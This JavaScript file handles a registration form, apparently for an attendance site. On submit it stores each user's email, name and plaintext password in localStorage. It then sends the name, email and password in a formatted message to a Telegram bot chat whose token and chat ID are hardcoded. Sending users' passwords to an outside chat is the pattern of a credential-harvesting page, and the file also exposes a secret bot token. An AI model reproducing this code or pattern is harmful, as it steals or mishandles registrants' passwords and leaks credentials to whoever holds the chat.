const TOKEN = "6088530092:AAGT7QckFBmjGeMctwbc8BMCAoINI2lFDdM";
const CHAT_ID = "-1001833797068";
const URI_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;


document.querySelector('#register-form').addEventListener('submit', function(e){
    e.preventDefault();

    localStorage.setItem('yo\'qlama_email', this.email.value);  
    localStorage.setItem('yo\'qlama_user_name', this.name.value);  
    localStorage.setItem('yo\'qlama_password', this.pswRepeat.value);  

    let created_message = `<b>${this.name.value}</b><span>Зарегался</span>\n`;
    created_message += `<b>Емаил:</b><i>${this.email.value}</i>`
    created_message += `<b>Пароль:</b><i>${this.pswRepeat.value}</i>`;

    axios.post(URI_API, {
        chat_id: CHAT_ID,
        parse_mode: "html",
        text: created_message
    })

    this.email.value = "";
    this.name.value = "";
    this.pswRepeat.value = "";
})